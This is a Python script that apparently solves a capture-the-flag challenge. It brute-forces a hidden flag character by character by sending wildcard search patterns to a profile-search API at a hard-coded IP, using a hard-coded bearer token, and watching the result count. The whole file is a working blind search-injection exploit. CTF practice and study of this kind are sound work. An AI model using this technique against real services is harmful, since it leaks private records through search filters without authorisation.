# writeup: https://x.com/SF7Dev/status/1997367651966841192?s=20 

import requests
import string

BASE_URL = "http://172.237.155.131:5000/api/profiles/"
USERNAME_FILTER = "flag_holder_secre"
TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDMsInVzZXJuYW1lIjoidGVzdCIsImV4cCI6MTc2NTEzMjIzOH0.Cpzw4U2AC6vrWEohKYo1TXnDsfTlFpQ4fNcO7WqmiD0"   # change this

# The charset to try
CHARSET = string.ascii_letters + string.digits + "_-!@#$%^&*{}"

# <-- the flag length found from observing the response -> flag{___....etc}
FLAG_LENGTH = 35   

def check_regex(regex):
    params = {
        "search": regex,                  # backend turns _ into .
        "username": USERNAME_FILTER,
        "page": "1",
        "perPage": "15"
    }
    headers = {"Authorization": TOKEN}

    r = requests.get(BASE_URL, params=params, headers=headers)
    data = r.json()
    return data.get("total", 0) == 1


def brute_flag():
    # Build template with underscores as wildcards
    flag = list("Flag{" + "_" * (FLAG_LENGTH - 5))

    print("[+] Template:", "".join(flag))

    for i in range(5, FLAG_LENGTH):  # start after 'Flag{'
        for ch in CHARSET:
            test = flag.copy()
            test[i] = ch               # guess char at position i

            attempt = "".join(test)
            print(f"[*] Trying: {attempt}")

            if check_regex(attempt):
                print(f"[+] Position {i} = {ch}")
                flag[i] = ch
                break

    return "".join(flag)


if __name__ == "__main__":
    final = brute_flag()
    print("\n FLAG FOUND:", final)
